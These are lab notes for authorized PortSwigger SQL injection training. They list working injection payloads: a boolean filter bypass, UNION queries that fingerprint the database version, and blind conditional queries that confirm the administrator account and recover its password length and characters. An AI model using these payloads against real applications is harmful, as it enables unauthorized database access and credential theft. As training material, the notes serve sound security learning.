# SQLi Payloads — Evidence-backed lab notes

For authorized PortSwigger training labs only. These are recorded inputs; not every payload is proven successful.

## Lab 01 — Boolean filter test
```sql
' OR 1=1--
```
Tests whether the category filter can be changed with a true condition.

## Lab 02 — UNION and DBMS fingerprinting attempts
```sql
' UNION SELECT 'abc','def' FROM dual--
' UNION SELECT BANNER, NULL FROM v$version--
' UNION SELECT @@version, NULL#
' UNION SELECT 'abc','def'#
' UNION SELECT 'abcdef',NULL,NULL--
```
UNION queries require compatible column counts and data types. `dual` and `v$version` are Oracle-associated; `@@version` is used by multiple DBMSs with dialect-specific behavior. `#` is a MySQL comment marker. The evidence does not prove each candidate succeeded.

## Lab 03 — Blind conditional-response patterns
```sql
' AND '1'='1'--
' AND '1'='2'--
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a'--
' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')='C'--
```
These patterns test true/false conditions, account existence, password length, and a candidate character at a selected position.

## Syntax cautions
Comment syntax varies by DBMS. In MySQL, `--` generally requires following whitespace. Preserve the dialect-specific syntax used by the lab.

## Redaction
Never publish active lab URLs, cookies, session identifiers, tokens, or extracted credentials. Replace them with `<REDACTED>`.
